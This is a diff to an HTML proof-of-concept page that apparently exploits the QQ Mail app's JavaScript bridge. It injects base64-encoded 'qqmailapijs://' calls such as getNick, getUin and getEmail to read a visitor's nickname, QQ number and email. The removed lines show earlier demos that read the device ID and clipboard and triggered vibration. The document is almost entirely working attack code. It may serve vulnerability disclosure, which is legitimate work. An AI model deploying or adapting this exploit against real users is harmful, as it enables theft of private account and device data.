@@ -51,26 +51,12 @@
     <p><span class="bold-and-larger">An attacker can:</span></p>
 
     <p><span class="larger">Get Your Account Info:</span></p>
-    <p style="font-size: 15px;" id="Cuid"></p>
-    <p style="font-size: 15px;" id="Zid"></p>
+    <p style="font-size: 15px;" id="NickName"></p>
+    <p style="font-size: 15px;" id="QQNumber"></p>
+    <p style="font-size: 15px;" id="Email"></p>
 
-    <p><span class="larger">Get Your Device Info:</span></p>
-    <p style="font-size: 15px;" id="IDFA"></p>
-
-    <p><span class="larger">Read Your ClipBoard:</span></p>    
-    Will get your ClipBoard text:
-    <p style="font-size: 15px;" id="ClipBoardText"></p>
-    <input type="button" value="Access ClipBoard" id="AccessClipBoard" style="font-size: 20px; padding: 20px 25px;"/>
-
-    <p><span class="larger">Vibrate Your Device Info:</span></p>
-    <p style="font-size: 15px;" id="VibrateResult"></p>
-    <input type="button" value="Vibrate" id="Vibrate" style="font-size: 20px; padding: 20px 25px;"/>
 
     <br><br><br>
-    
-    <!-- <script type="text/javascript" src="vendor-b559d29db01f26012cc1.js"></script>
-    <script type="text/javascript" src="utils-00a144d9c34af361c0a3.js"></script>
-    <script type="text/javascript" src="20221230rflower3-aafd6690d5d8a352b56e.js"></script> -->
     
     <script>
         
@@ -81,13 +67,6 @@
             document.body.appendChild(iframe);
         }
 
-        var qmailBridge = {}; 
-
-        qmailBridge.handleMessage = function (res){
-            result = JSON.stringify(res);
-            console.log("[attacker]:" + result);
-        }
-        
         base64Encode = function (e) {
             var t, n, i, o, a, r, c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
             if (void 0 === e) return e;
@@ -124,18 +103,48 @@
             return t
         }
 
-        // '["{\"func\":\"getDeviceId\",\"params\":{},\"callbackId\":\"1011\"}"]'
-        var str1 = '[\"{\\\"func\\\":\\\"getDeviceId\\\",\\\"params\\\":{},\\\"callbackId\\\":\\\"1011\\\"}\"]';
-        // console.log(base64Encode(utf8Encode(str1)));
+        
+        var qmailBridge = {}; 
+
+        qmailBridge.handleMessage = function (res) {
+            var json = res;
+            switch (json.callbackId) {
+                case "001":
+                    document.getElementById("NickName").innerText = "Your NickName: " + json.params;
+                    break;
+                case "002":
+                    document.getElementById("QQNumber").innerText = "Your QQ Number: " + json.params;
+                    break;
+                case "003":
+                    document.getElementById("Email").innerText = "Your Email: " + json.params;
+                    break;
+            }
+        }
+
+        var str1 = '[\"{\\\"func\\\":\\\"getNick\\\",\\\"params\\\":{},\\\"callbackId\\\":\\\"001\\\"}\"]';
         qmailBridge.fetchQueue = function(){
             fetchData("qqmailapijs://private/setresult/fetchqueue&" + base64Encode(utf8Encode(str1)));
             return str1;
         }
         fetchData("qqmailapijs://dispatch_message/");
-        // 成功
-        // [Log] [attacker]:{"callbackId":"1011","successOrNot":true,"params":""}
 
+        setTimeout(function () {
+            var str2 = '[\"{\\\"func\\\":\\\"getUin\\\",\\\"params\\\":{},\\\"callbackId\\\":\\\"002\\\"}\"]';
+            qmailBridge.fetchQueue = function () {
+                fetchData("qqmailapijs://private/setresult/fetchqueue&" + base64Encode(utf8Encode(str2)));
+                return str2;
+            }
+            fetchData("qqmailapijs://dispatch_message/");
+        }, 500);
 
+        setTimeout(function () {
+            var str2 = '[\"{\\\"func\\\":\\\"getEmail\\\",\\\"params\\\":{},\\\"callbackId\\\":\\\"003\\\"}\"]';
+            qmailBridge.fetchQueue = function () {
+                fetchData("qqmailapijs://private/setresult/fetchqueue&" + base64Encode(utf8Encode(str2)));
+                return str2;
+            }
+            fetchData("qqmailapijs://dispatch_message/");
+        }, 1000);
 
     </script>
 
